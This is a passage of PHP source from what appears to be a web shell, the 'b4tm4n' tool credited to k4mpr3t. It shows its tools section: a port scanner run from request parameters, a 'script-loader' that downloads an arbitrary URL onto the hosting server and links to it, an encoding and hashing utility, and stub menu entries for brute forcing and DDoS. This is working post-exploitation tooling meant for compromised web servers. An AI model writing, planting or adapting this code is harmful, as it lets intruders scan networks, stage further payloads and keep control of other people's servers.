						<label>Methode</label><select id='scan-port'><option value='1'>socket_connect</option><option value='2'>fsockopen</option></select><br>
						<input type='submit' onclick=\"return getAjax(true,'port-result','POST','?z=port-scanner&x=scan-port&ip='+document.getElementById('ip-port').value+'&sp='+document.getElementById('start-port').value+'&ep='+document.getElementById('end-port').value+'&mtd='+document.getElementById('scan-port').value);\" value=Scan />
						<input type='submit' onclick=\"return ajaxAbort(true,'port-result')\" value=Cancel />
					</form>
				</div>
				<div id='port-result' class='result'></div>",gethostbyname(http_host));

		if(any("x",$_REQUEST)&&$_REQUEST['x']=="scan-port")
		{
			ob_clean();
			$host=$_REQUEST['ip'];
			$from=$_REQUEST['sp'];
			$to  =$_REQUEST['ep'];
			$mtd =$_REQUEST['mtd'];
			switch($mtd)
			{
				case '1':
					if(function_exists('socket_create'))
					{
						$socket=@socket_create(AF_INET ,SOCK_STREAM ,SOL_TCP); 
						for($conn_port=$from;$conn_port <=$to;$conn_port++)
						{
							$conn=@socket_connect($socket ,$host, $conn_port);
							if($conn) 
							{ 
								echo "<br>port $conn_port open";
								socket_close($socket);
								$socket=@socket_create(AF_INET ,SOCK_STREAM ,SOL_TCP);
							}
						}
					}
					else
					{
						echo "Error socket_connect<br>";
					}
				break;
				case '2':
					for($conn_port=$from;$conn_port <=$to;$conn_port++)
					{
						$conn=@fsockopen($host,$conn_port);
						if($conn)
						{
							echo "<br>port $conn_port open";
							fclose($conn);
						}
					}
				break;
			}
			echo "<br>Scan Finish.";
			exit;
		}
	}
	if($z=="script-loader")
	{
		echo "<div class='tools-header'>
				  <h3>".$menu_tools[$z]['title']." v".$menu_tools[$z]['ver']."</h3>
				  <h3> by: ".$menu_tools[$z]['auth']."</h3>
			  </div>";

		printf("<div id='script-loader'>
			<form onsubmit='return false;' class='new'>
				<label>Url</label><input type='text' id='url-source' value=''/><br>
				<label>Filename</label><input type='text' id='file-name' value=''/><br>
				<input type='submit' onclick=\"return getAjax(true,'download-result','POST','?z=script-loader&url='+document.getElementById('url-source').value+'&filename='+document.getElementById('file-name').value);\"/><br>
			</form>
		</div>
		<div id='download-result' class='result'></div>");

		if(any("url",$_REQUEST)&&any("filename",$_REQUEST))
		{
			ob_clean();
			$url=$_REQUEST['url'];
			$filename=$_REQUEST['filename'];
			$path=dirname(__FILE__)._.'script-loader';
			if(!is_dir($path)) mkdir($path,0755);
			$dest=rtrim($path,_)._.$filename;
			if(GetUrlExists($url)&&!empty($filename))
			{
				if(GetDownloadUrl($url,$dest))
				{
					$url=GetUrlFromPath($dest);
					printf("Success -> <a href='$url' target='_blank'><u>Link</u></a>");
				}
				else
				{
					echo "<br>Failed";
				}
				echo "<br>Finish";
			}
			else
			{
				echo "<br>Mistakes";
			}
			exit;
		}
	}
	if($z=="encryptor")
	{
		echo "<div class='tools-header'>
				  <h3>".$menu_tools[$z]['title']." v".$menu_tools[$z]['ver']."</h3>
				  <h3> by: ".$menu_tools[$z]['auth']."</h3>
			  </div>";

		printf("<div id='script-loader'>
			<form onsubmit='return false;' class='new'>
				<div class='hash-control'>
					<div class='hash'>
						<input type='radio' name='encr' value='basic' checked><label>Basic</label>
						<select id='basic-hash'>
							<option value='md5'>Md5</option>
							<option value='asc'>Char</option>
							<option value='chr'>Ascii</option>
							<option value='sha1'>Sha1</option>
							<option value='crc32'>Crc32</option>
							<option value='urlencode'>URL Encode</option>
							<option value='urldecode'>URL Decode</option>
							<option value='strlen'>String Length</option>
							<option value='strrev'>String Reverse</option>
							<option value='base64_encode'>Base64 Encode</option>
							<option value='base64_decode'>Base64 Decode</option>
							<option value='B64E'>B64E</option>
							<option value='B64D'>B64D</option>
							<option value='entties'>Htmlentities</option>
							<option value='spechar'>Htmlspecialchars</option>
						</select>
					</div>
					<div class='hash'>
						<input type='radio' name='encr' value='extra'><label>Extra</label>
						<select id='extra-hash'>
							<option value='asc-hex'>Ascii => Hex</option>
							<option value='asc-bin'>Ascii => Binary</option>
							<option value='hex-asc'>Hex => Ascii</option>
							<option value='hex-bin'>Hex => Binary</option>
							<option value='bin-asc'>Binary => Ascii</option>
							<option value='bin-hex'>Binary => Hex</option>
						</select>
					</div>
					<div class='hash'>
						<input type='radio' name='encr' value='crypt'><label>Crypt</label>
						<input type='text' id='crypt-salt' name='salt' placeholder='\$alt'/>
					</div>
					<div class='hash'>
						<input type='radio' name='encr' value='hash'><label>Hash</label>
						<select id='hash-hash'><option value='md2'>md2</option><option value='md4'>md4</option><option value='md5'>md5</option><option value='sha1'>sha1</option><option value='sha256'>sha256</option><option value='sha384'>sha384</option><option value='sha512'>sha512</option><option value='ripemd128'>ripemd128</option><option value='ripemd160'>ripemd160</option><option value='ripemd256'>ripemd256</option><option value='ripemd320'>ripemd320</option><option value='whirlpool'>whirlpool</option><option value='tiger128,3'>tiger128,3</option><option value='tiger160,3'>tiger160,3</option><option value='tiger192,3'>tiger192,3</option><option value='tiger128,4'>tiger128,4</option><option value='tiger160,4'>tiger160,4</option><option value='tiger192,4'>tiger192,4</option><option value='snefru'>snefru</option><option value='gost'>gost</option><option value='adler32'>adler32</option><option value='crc32'>crc32</option><option value='crc32b'>crc32b</option><option value='haval128,3'>haval128,3</option><option value='haval160,3'>haval160,3</option><option value='haval192,3'>haval192,3</option><option value='haval224,3'>haval224,3</option><option value='haval256,3'>haval256,3</option><option value='haval128,4'>haval128,4</option><option value='haval160,4'>haval160,4</option><option value='haval192,4'>haval192,4</option><option value='haval224,4'>haval224,4</option><option value='haval256,4'>haval256,4</option><option value='haval128,5'>haval128,5</option><option value='haval160,5'>haval160,5</option><option value='haval192,5'>haval192,5</option><option value='haval224,5'>haval224,5</option><option value='haval256,5'>haval256,5</option></select>
						<input type='checkbox' id='hash-raw'/> Raw
					</div>
					<div class='hash'>
						<input type='submit' onclick=\"
						url='';
						radios=document.getElementsByName('encr');
						for(var i=0,length=radios.length;i<length;i++){
							if (radios[i].checked){
								switch(radios[i].value){
									case 'basic':
										url='?z=encryptor&opt=basic&hash='+document.getElementById('basic-hash').value+'&text='+document.getElementById('hashtext').value;
									break;
									case 'extra':
										url='?z=encryptor&opt=extra&hash='+document.getElementById('extra-hash').value+'&text='+document.getElementById('hashtext').value;
									break;
									case 'crypt':
										url='?z=encryptor&opt=crypt&salt='+document.getElementById('crypt-salt').value+'&text='+document.getElementById('hashtext').value;
									break;
									case 'hash':
										url='?z=encryptor&opt=hash&hash='+document.getElementById('hash-hash').value+'&raw='+document.getElementById('hash-raw').checked+'&text='+document.getElementById('hashtext').value;
									break;
								}
								break;
							}
						}
						return getAjax(false,'hashresult','POST',url);
						\"/>
						<input type='submit' onclick=\"
							temp=document.getElementById('hashresult').value;
							temp1=document.getElementById('hashtext').value;
							document.getElementById('hashtext').value=temp;
							document.getElementById('hashresult').value=temp1;
						\" value='Swap'/>
					</div>
				</div>
				<div class='hash-capture'>
					<div class='hash-capture-left'>
						<label>String</label><textarea id='hashtext'></textarea>
						<input type='submit' onclick=\"
							document.getElementById('hashtext').value='';
						\" value='Clear'/>
					</div>
					<div class='hash-capture-right'>
						<label>Result</label><textarea id='hashresult'></textarea>
						<input type='submit' onclick=\"
							document.getElementById('hashresult').value='';
						\" value='Clear'/>
					</div>
				</div>
			</form>
		</div>");

		function chr_asc($str){
			$asc='';
			for ($i=0;$i<strlen($str);$i++) 
				$asc.=ord($str{$i}).' ';
			return rtrim($asc);
		} 

		function asc_chr($asc){
			$str='';
			if (strpos($asc,' ')) {
				$exps=explode(' ',$asc);
				foreach($exps as $exp)
					$str.=chr($exp);
			} else {
				$str=chr($asc);
			}
			return $str;
		} 

		function asc_hex($asc){
			$hex='';
			for ($i=0;$i<strlen($asc);$i++) 
				$hex.=sprintf("%02x",ord(substr($asc,$i,1)));
			return $hex;
		}

		function hex_asc($hex){
			$asc='';
			for ($i=0;$i<strlen($hex);$i+=2) 
				$asc.=chr(hexdec(substr($hex,$i,2)));
			return $asc;
		}

		function hex_bin($hex){
			$bin='';
			for($i=0;$i<strlen($hex);$i++)
				$bin.=str_pad(decbin(hexdec($hex{$i})),4,'0',STR_PAD_LEFT);
			return $bin;
		}

		function bin_hex($bin){
			$hex='';
			for($i=strlen($bin)-4;$i>=0;$i-=4)
				$hex.=dechex(bindec(substr($bin,$i,4)));
			return strrev($hex);
		}

		function asc_bin($asc){
			$hex=asc_hex($asc);
			return hex_bin($hex);
		}

		function bin_asc($bin){ 
		    $hex=bin_hex($bin);
			return hex_asc($hex);
		}
		
		if(any("opt",$_REQUEST))
		{
			ob_clean();
			$opt=$_REQUEST['opt'];
			$text=$_REQUEST['text'];
			if ($opt=='basic')
			{
				$hash=$_REQUEST['hash'];
				switch($hash)
				{
					case "md5":print md5($text);break;
					case "sha1":print sha1($text);break;
					case "chr":print asc_chr($text);break;
					case "asc":print chr_asc($text);break;
					case "crc32":print crc32($text);break;
					case "strlen":print strlen($text);break;
					case "strrev":print strrev($text);break;
					case "urlencode":print urlencode($text);break;
					case "urldecode":print urldecode($text);break;
					case "entties":print htmlentities($text);break;
					case "spechar":print htmlspecialchars($text);break;
					case "base64_encode":print base64_encode($text);break;
					case "base64_decode":print base64_decode($text);break;
					case "B64E":print B64E($text);break;
					case "B64D":print B64D($text);break;
				}
			}
			elseif($opt=='extra')
			{
				$hash=$_REQUEST['hash'];
				switch($hash)
				{
					case "chr-asc":print str_asc($text);break;
					case "asc-chr":print asc_str($text);break;
					case "asc-hex":print asc_hex($text);break;
					case "hex-asc":print hex_asc($text);break;
					case "hex-bin":print hex_bin($text);break;
					case "bin-hex":print bin_hex($text);break;
					case "asc-bin":print asc_bin($text);break;
					case "bin-asc":print bin_asc($text);break;
				}
			}
			elseif($opt=='crypt')
			{
				$salt=$_REQUEST['salt'];
				print crypt($text,$salt);
			}
			elseif($opt=='hash')
			{
				$hash=$_REQUEST['hash'];
				$raw=$_REQUEST['raw'];
				if($raw=='true')
				{
					print hash($hash,$text,true);
				}
				else
				{
					print hash($hash,$text);
				}
			}
			exit;
		}
	}
	if($z=="frmail-bruteforces")
	{
		print "Coming Soon";
	}
	if($z=="login-bruteforces")
	{
		print "Coming Soon";
	}
	if($z=="mass-tools")
	{
		print "Coming Soon";
	}
	if($z=="ddos-attack")
	{
		print "Coming Soon";
	}

	echo "</div>";
}
/* END CUSTOM TOOLZ */

printf("</div><!-- content -->
		</div><!-- container -->
			<div id='footer'>
				<div id='copyrights'><a href='//github.com/k4mpr3t/b4tm4n'>k4mpr3t</a> &copy; %s</div>
				<div id='pageload'>Page Loaded in %s Seconds</div>
			</div>
		</body>
		</html>",date('Y'),round((microtime(true) - $start),2)
);

}?>